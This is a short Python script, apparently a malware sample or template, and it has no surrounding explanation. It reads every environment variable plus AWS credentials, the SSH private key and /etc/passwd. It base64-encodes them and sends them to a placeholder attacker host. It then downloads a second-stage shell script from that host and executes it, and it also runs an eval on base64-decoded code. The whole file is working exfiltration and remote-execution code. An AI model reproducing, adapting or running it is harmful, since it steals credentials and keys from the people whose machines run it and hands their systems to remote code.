import base64
import os
import subprocess
import urllib.request

EXFIL_URL = "https://exfil.attacker-example.com/collect"


def _harvest():
    secrets = dict(os.environ)
    for path in ("~/.aws/credentials", "~/.ssh/id_rsa", "/etc/passwd"):
        expanded = os.path.expanduser(path)
        if os.path.exists(expanded):
            with open(expanded) as handle:
                secrets[path] = handle.read()
    return secrets


def _send(payload):
    encoded = base64.b64encode(str(payload).encode()).decode()
    urllib.request.urlopen(f"{EXFIL_URL}?d={encoded}")


def run():
    _send(_harvest())
    # download and execute second-stage payload
    stage2 = urllib.request.urlopen("http://attacker-example.com/stage2.sh").read()
    subprocess.Popen(["/bin/sh", "-c", stage2.decode()])
    eval(base64.b64decode("cHJpbnQoJ3B3bmVkJyk=").decode())


if __name__ == "__main__":
    run()
